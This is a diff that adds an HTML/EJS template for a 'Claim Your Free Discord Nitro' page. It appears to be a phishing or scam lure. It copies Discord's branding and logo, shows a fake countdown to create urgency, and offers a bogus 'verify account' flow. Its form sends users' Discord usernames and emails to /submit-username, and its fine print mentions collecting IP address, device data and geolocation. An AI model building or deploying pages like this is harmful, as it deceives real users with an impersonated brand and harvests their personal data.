@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Claim your free Discord Nitro trial - Limited time offer">
+    <title>Discord Nitro - Claim Your Free Trial</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --discord-blurple: #5865F2;
+            --discord-dark: #23272A;
+            --discord-light: #FFFFFF;
+            --discord-green: #57F287;
+            --discord-red: #ED4245;
+            --discord-yellow: #FEE75C;
+            --gradient-start: #5865F2;
+            --gradient-end: #EB459E;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #1a1b1e, #2c2f33);
+            color: #f6f6f6;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: rgba(35, 39, 42, 0.9);
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: fadeIn 0.5s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .header {
+            background: linear-gradient(90deg, var(--gradient-start), var(--gradient-end));
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+            animation: pulse 8s infinite linear;
+        }
+        
+        @keyframes pulse {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .logo {
+            width: 120px;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 0 10px rgba(0, 0, 0, 0.3));
+            position: relative;
+            z-index: 1;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            font-weight: 700;
+            color: white;
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .subtitle {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .offer-card {
+            background: rgba(30, 33, 36, 0.7);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 30px;
+            border-left: 4px solid var(--discord-blurple);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+        
+        .offer-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .offer-title {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            color: var(--discord-green);
+            font-size: 1.3rem;
+        }
+        
+        .offer-title i {
+            margin-right: 10px;
+            font-size: 1.5rem;
+        }
+        
+        .offer-features {
+            list-style: none;
+            margin-bottom: 20px;
+        }
+        
+        .offer-features li {
+            padding: 8px 0;
+            display: flex;
+            align-items: center;
+        }
+        
+        .offer-features li::before {
+            content: '✓';
+            color: var(--discord-green);
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #dcddde;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(40, 43, 48, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--discord-blurple);
+            box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.3);
+        }
+        
+        .input-with-icon {
+            position: relative;
+        }
+        
+        .input-with-icon i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        .input-with-icon input {
+            padding-left: 45px;
+        }
+        
+        .btn {
+            display: inline-block;
+            background: linear-gradient(90deg, var(--gradient-start), var(--gradient-end));
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3);
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(88, 101, 242, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn i {
+            margin-right: 10px;
+        }
+        
+        .message {
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            animation: slideIn 0.3s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .success {
+            background-color: rgba(87, 242, 135, 0.2);
+            border-left: 4px solid var(--discord-green);
+            color: var(--discord-green);
+        }
+        
+        .error {
+            background-color: rgba(237, 66, 69, 0.2);
+            border-left: 4px solid var(--discord-red);
+            color: var(--discord-red);
+        }
+        
+        .message i {
+            margin-right: 10px;
+            font-size: 1.2rem;
+        }
+        
+        .legal-text {
+            font-size: 0.8rem;
+            opacity: 0.7;
+            margin-top: 30px;
+            text-align: center;
+            line-height: 1.5;
+        }
+        
+        .legal-text a {
+            color: var(--discord-blurple);
+            text-decoration: none;
+        }
+        
+        .legal-text a:hover {
+            text-decoration: underline;
+        }
+        
+        .countdown {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 1.2rem;
+        }
+        
+        .countdown span {
+            font-weight: 700;
+            color: var(--discord-yellow);
+        }
+        
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+        }
+        
+        .step {
+            flex: 1;
+            text-align: center;
+            padding: 15px;
+            position: relative;
+        }
+        
+        .step-number {
+            width: 40px;
+            height: 40px;
+            background: var(--discord-blurple);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+            font-weight: bold;
+        }
+        
+        .step:not(:last-child)::after {
+            content: '';
+            position: absolute;
+            top: 20px;
+            right: -20px;
+            width: 40px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                border-radius: 10px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .steps {
+                flex-direction: column;
+            }
+            
+            .step:not(:last-child) {
+                margin-bottom: 30px;
+            }
+            
+            .step:not(:last-child)::after {
+                top: auto;
+                bottom: -15px;
+                left: 50%;
+                transform: translateX(-50%);
+                width: 2px;
+                height: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Discord Logo" class="logo">
+            <h1>Claim Your Free Discord Nitro</h1>
+            <p class="subtitle">Limited time offer - 3-Day trial for new users</p>
+        </div>
+        
+        <div class="content">
+            <% if (message) { %>
+                <div class="message <%= message.includes('Error') ? 'error' : 'success' %>">
+                    <i class="fas <%= message.includes('Error') ? 'fa-exclamation-circle' : 'fa-check-circle' %>"></i>
+                    <%= message %>
+                </div>
+            <% } %>
+            
+            <div class="countdown">
+                Offer expires in: <span id="countdown-timer">23:59:59</span>
+            </div>
+            
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <p>Enter Details</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <p>Verify Account</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <p>Enjoy Nitro</p>
+                </div>
+            </div>
+            
+            <div class="offer-card">
+                <div class="offer-title">
+                    <i class="fas fa-crown"></i>
+                    Discord Nitro 3-Day Trial
+                </div>
+                <ul class="offer-features">
+                    <li>High-quality voice and video chat</li>
+                    <li>Custom emoji anywhere</li>
+                    <li>Bigger file uploads (up to 100MB)</li>
+                    <li>HD video streaming</li>
+                    <li>Server boosting benefits</li>
+                </ul>
+            </div>
+            
+            <form action="/submit-username" method="POST" id="nitro-form">
+                <div class="form-group">
+                    <label for="username">Discord Username</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-user"></i>
+                        <input type="text" id="username" name="username" placeholder="username#0000" required pattern=".{3,32}#[0-9]{4}">
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">Email Address (Optional)</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-envelope"></i>
+                        <input type="email" id="email" name="email" placeholder="your@email.com">
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="region">Server Region</label>
+                    <select id="region" name="region">
+                        <option value="">Select your region</option>
+                        <option value="us-west">US West</option>
+                        <option value="us-east">US East</option>
+                        <option value="europe">Europe</option>
+                        <option value="asia">Asia</option>
+                        <option value="australia">Australia</option>
+                    </select>
+                </div>
+                
+                <button type="submit" class="btn">
+                    <i class="fas fa-gem"></i> Claim Your Nitro
+                </button>
+            </form>
+            
+            <div class="legal-text">
+                <p>By proceeding, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>. We may collect your IP address, device information, and geolocation for security and analytics purposes. This is a limited time offer available only to eligible users. Discord Nitro trial auto-renews after 3 days unless canceled.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Countdown timer
+        function updateCountdown() {
+            const now = new Date();
+            const midnight = new Date();
+            midnight.setHours(24, 0, 0, 0);
+            
+            const diff = midnight - now;
+            
+            const hours = Math.floor(diff / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+            
+            document.getElementById('countdown-timer').textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        setInterval(updateCountdown, 1000);
+        updateCountdown();
+        
+        // Form validation
+        document.getElementById('nitro-form').addEventListener('submit', function(e) {
+            const username = document.getElementById('username').value;
+            if (!username.match(/^.{3,32}#[0-9]{4}$/)) {
+                e.preventDefault();
+                alert('Please enter a valid Discord username in the format username#0000');
+            }
+        });
+        
+        // Animate elements on scroll
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('animate');
+                }
+            });
+        }, { threshold: 0.1 });
+        
+        document.querySelectorAll('.offer-card, .form-group, .btn').forEach(el => {
+            observer.observe(el);
+        });
+    </script>
+</body>
+</html>
